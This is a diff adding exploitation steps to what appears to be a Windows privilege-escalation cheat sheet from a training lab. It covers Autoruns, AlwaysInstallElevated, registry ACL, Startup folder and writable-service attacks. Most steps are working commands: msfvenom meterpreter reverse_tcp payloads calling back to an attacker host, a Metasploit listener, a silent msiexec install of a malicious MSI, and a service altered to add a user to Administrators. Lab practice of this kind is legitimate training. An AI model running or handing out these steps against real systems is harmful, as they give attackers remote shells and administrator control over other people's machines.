@@ -103,32 +103,84 @@ ms.exe <Kali-IP> 5555  # From target
 
 ### Service Exploits
 
+```powershell
+```
+
 ### Registry Exploits
 
 #### Autoruns
 
 ```powershell
-# Enumeration
+# Detection
+# Open command prompt and type:
 C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
-
+#In Autoruns, click on the ‘Logon’ tab.
+# From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
+# In command prompt type: 
 C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
-# Looking for FILE_ALL_ACCESS for Everyone
+# From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.
 
 powershell -ep bypass
 . .\PowerIp.ps1
 Invoke-AllChecks
-# Exploitation
 
+# Exploitation
+msfconsole
+msf > use multi/handler
+msf > set payload windows/meterpreter/reverse_tcp
+msf > run
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> -f exe -o program.exe
+# Copy program.exe to the Windows target
+# Place program.exe in ‘C:\Program Files\Autorun Program’.
+# To simulate the privilege escalation effect, logoff and then log back on as an administrator user.
+# In Kali, wait for a session to open in Metasploit
 ```
 
 #### AlwaysInstallElevated
 
 ```powershell
+# Detection
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+# From the output, notice that "AlwaysInstallElevated" value is 1
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+# From the output, notice that “AlwaysInstallElevated” value is 1.
+
+# Exploitation
+## From Kali
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost [Kali VM IP Address]
+run
+# Open an additional command prompt and type:
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> -f msi -o setup.msi
+# Copy the generated file, setup.msi, to the Windows VM.
+
+## From Windows Target
+# Place ‘setup.msi’ in ‘C:\Temp’.
+# Open command prompt and type:
+msiexec /quiet /qn /i C:\Temp\setup.msi
 ```
 
 #### regsvc ACL
 
 ```powershell
+# Detection
+powershell -ep bypass
+Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+# Notice that the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.
+
+# Exploitation
+# Copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ to the Kali VM.
+# In Kali, open windows_service.c in a text editor and replace the command used by the system() function to:
+cmd.exe /k net localgroup administrators user /add
+x86_64-w64-mingw32-gcc windows_service.c -o x.exe  # NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64'
+# Copy the generated file x.exe, to the Windows VM
+
+# Place x.exe in ‘C:\Temp’.
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+sc start regsvc
+net localgroup administrators
 ```
 
 ### Passwords
@@ -165,6 +217,19 @@ winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"
 ### Insecure GUI Apps
 
 ### Startup Apps
+
+```powershell
+# Detection
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+# From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.
+
+# Exploitation
+Metasploit, use multi/handler, set payload windows/meterpreter/reverse_tcp, run
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o x.exe
+# Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.
+# Logoff and Login with admin account credentials
+# Wait for session to be created in Metasploit
+```
 
 ### Installed Apps
 
@@ -244,4 +309,24 @@ C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\S
 ### DLL Hijacking
 
 ```powershell
+# Detection
+
+# Exploitaion
+
+```
+
+### Executable Files
+
+```powershell
+# Detection
+powershell -ep bypass
+Invoke-AllChecks
+# If we know where the service exists:
+C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
+# Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.
+
+# Exploitation
+copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
+sc start filepermsvc
+net localgroup administrators
 ```
